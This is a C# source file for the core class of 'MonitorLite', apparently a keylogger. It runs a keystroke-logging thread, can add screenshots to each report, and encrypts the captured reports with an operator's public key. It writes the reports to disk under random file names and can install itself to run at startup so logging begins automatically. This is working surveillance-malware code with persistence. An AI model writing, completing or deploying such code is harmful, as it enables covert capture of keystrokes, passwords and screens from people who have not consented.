using MonitorLiteCommon;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MonitorLiteCore
{

    public class MonitorLite
    {
        private bool _closed = false;
        private int _status;

        public int Status { get { return _status; } private set { CheckClose(); _status = value; OnStatusChange?.Invoke(this, EventArgs.Empty); } }
        public bool Enabled { get { return Status == 1; } private set { Status = value ? 1 : 0; } }
        public string StatusMessage { get { return Helpers.ConvertStatus(Status); } }
        public MonitorSettings Settings { get; private set; }

        public event EventHandler OnStatusChange;
       

        private Thread keylogThread;
     


        internal MonitorLite(MonitorSettings settings)
        {
            this.Settings = settings;
            ReportManager.MaxReportSize = settings.MaxLogSize;

            if (!Initialize())
            {
                throw new Exception("Failed to initialize");
            }
        }

       
        internal void OnReport(object sender, ReportManagerEventArgs e)
        {
            CheckClose();



            Report r = e.Report;

            WriteReport(r);

            if (Settings.TakeScreenshots)
            {
                Report screen_r = Report.CreateImageReport("Screenshot", Helpers.TakeScreenshot());
                WriteReport(screen_r);
            }


        }

        private void WriteReport(Report r)
        {
            byte[] reportData = Helpers.EncryptReport(r, Settings.PublicKey);

            string reportName = string.Format("{0}{1}", Guid.NewGuid().ToString("N"), Settings.ReportExtension);

            string reportPath = Environment.ExpandEnvironmentVariables(Settings.ReportStoragePath);

            if (!Directory.Exists(reportPath))
                Directory.CreateDirectory(reportPath).Refresh();

            reportPath = Path.Combine(reportPath, reportName);

            File.WriteAllBytes(reportPath, reportData);
        }

        public void Start()
        {
            CheckClose();

            if (Enabled)
                return;

            keylogThread = KeylogManager.Start();

            Enabled = true;

        }

        public void Stop()
        {
            CheckClose();

            if (!Enabled)
                return;

            KeylogManager.Stop(keylogThread);

            Enabled = false;

        }

        public void Close()
        {
            CheckClose();

            Stop();
            ReportManager.OnReport -= OnReport;
            _closed = true;
        }

        private void CheckClose()
        {
            if (_closed)
                throw new ObjectDisposedException(this.ToString());
        }

        private bool Initialize()
        {

            if (this.Settings.StartOnStartup)
            {
                Helpers.SetStartup(typeof(MonitorLite).Assembly.GetName().Name);
            }

          
           
            
            if (this.Settings.StartLoggingOnStartup)
            {
                this.Start();
            }

            return true;
        }





    }
}
